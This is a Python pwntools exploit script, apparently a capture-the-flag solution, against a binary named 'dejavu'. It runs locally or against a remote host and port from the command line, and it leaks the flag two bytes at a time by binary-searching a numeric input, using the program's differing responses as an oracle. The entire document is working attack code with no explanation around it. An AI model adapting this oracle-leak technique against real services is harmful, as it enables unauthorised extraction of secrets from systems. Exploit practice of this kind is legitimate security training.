#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./dejavu', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

def check(idx, v2):
    p.sendlineafter(b"Which door you want to go?", str(idx).encode())
    p.sendlineafter(b"How far you wanna run from this dream?", str(v2).encode())
    p.sendafter(b"How can you know this is not a dream?", b'\n')
    resp = p.recvuntil(b'Dejavu dream welcomes you!')

    log.info(resp + b"yessir")    
    if b"Still can't wake up" in resp:
        return False
    elif b"Run away now" in resp:
        return True
    
    return False

def binary_search(idx):
    low = 0
    high = 65535
    ans = 0

    while low <= high:
        mid = (low + high) // 2
        if check(idx, mid):
            ans = 0x10000 - mid
            high = mid - 1
        else:
            low = mid + 1

    return ans

flag_bytes = b""
for i in range(16, 16 + 30): 
    val = binary_search(i)
    
    chunk = p16(val)
    flag_bytes += chunk
    
    print(f"Index {i}: Found {hex(val)} -> {chunk}")
    if b'}' in chunk:
        break

print(f"Recovered flag bytes: {flag_bytes}")
p.interactive()